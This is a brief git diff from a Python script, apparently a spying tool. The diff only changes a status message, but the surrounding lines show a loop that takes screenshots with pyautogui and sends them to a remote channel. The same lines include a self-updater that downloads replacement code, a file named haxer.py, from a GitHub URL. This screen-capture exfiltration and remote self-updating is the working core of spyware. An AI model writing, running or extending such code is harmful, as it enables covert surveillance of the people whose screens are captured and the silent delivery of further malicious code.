@@ -18,7 +18,7 @@ sendMsg("Successfully connected!")
 while True:
   # Send Data
   screenshot = pyautogui.screenshot()
-  sendMsg(f"# Update at {str(datetime.datetime.now())}\nScreenshot:", screenshot)
+  sendMsg(f"# Update at {str(datetime.datetime.now())}\nHallo\nScreenshot:", screenshot)
 
   # Self-Updater
   r = requests.get("https://raw.githubusercontent.com/kiwuthegamer/Metamorphic/main/haxer.py")
